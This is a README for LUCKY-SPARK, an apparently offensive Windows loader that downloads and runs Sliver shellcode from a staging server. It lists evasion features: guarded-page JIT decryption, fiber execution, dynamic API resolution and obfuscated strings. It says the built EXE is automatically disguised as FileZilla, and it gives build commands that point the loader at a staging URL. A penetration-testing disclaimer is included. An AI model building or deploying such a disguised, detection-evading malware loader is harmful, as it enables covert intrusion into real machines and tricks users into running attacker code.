
# LUCKY-SPARK

⟪ **LUCKY-SPARK** ⟫ is an advanced Windows payload loader designed to securely execute Sliver and other http/https staged payloads while minimizing memory exposure. It combines obfuscation and execution techniques to enhance stealth and resilience against analysis.

---

## Features

* **Staged Sliver Payload Loader**  Downloads and executes a Sliver payload from a specified server.
* **JIT Shellcode Decryption**  Uses a Just‑In‑Time page decryption engine with **Windows Vectored Exception Handling (VEH)** and guarded memory pages, minimising in-memory exposure. 
* **Fiber-based Execution**  Runs shellcode within fibers for improved stealth and complicating analysis.
* **Dynamic API Resolution**  Suspicious or detection-prone Windows API functions are dynamically loaded at runtime.
* **String Obfuscation**  Sensitive strings (e.g., URLs, user agents) are encrypted using an **affine cipher** and stored obfuscated in compiled binaries.
* **Automatic Disguise**  EXE is automatically disguised as **FileZilla** with proper manifest, version information, and icons.
* **Customizable User-Agent**  Supports specifying a custom User-Agent string for network requests.
* **Config-Only Mode**  Option to generate only configuration files without building the full binary.
* **Interactive Prompts**  Command-line interface prompts for URL and optional User-Agent if not provided.

---

## Installation

Clone or download the repository and ensure you have `make` and `mingw` installed on your system.

```bash
git clone <repository_url>
cd LUCKY-SPARK
```

---

## Usage


### Interactive 
```bash
./luckySpark.sh
```
![Interactive](images/LSScreenshot1.png)


### One Line 
```bash
./luckySpark.sh -u https://example.com/stage -a "Mozilla/5.0"
```
![One Line ](images/LSScreenshot2.png)


### Run the Loader
This creates a binary `filezilla.exe` which when executed retrieves and executes the payload. 


---

## Security & Disclaimer

**LUCKY-SPARK** is intended for **educational, research, and authorized penetration testing** only. Unauthorized use against systems without permission is illegal and unethical.

---

## Staging a Payload

This stager was designed to be used with Sliver.
Stage a Sliver payload as described here [Sliver Staging](https://sliver.sh/tutorials?name=4+-+HTTP+Payload+staging)
Encrypting the payload is not necessary. 

But any http/https based staging method will work. 
like `python3 -m http.server`

This stager does **NOT** support the meterpreter staging protocol.

---

[![VT](images/VTScreenshot.png)](https://www.virustotal.com/gui/file/40aa8e9240b7b2c5b5fc9359be630c705c239be0f73de72fdf49cc0875efd4dc/detection)






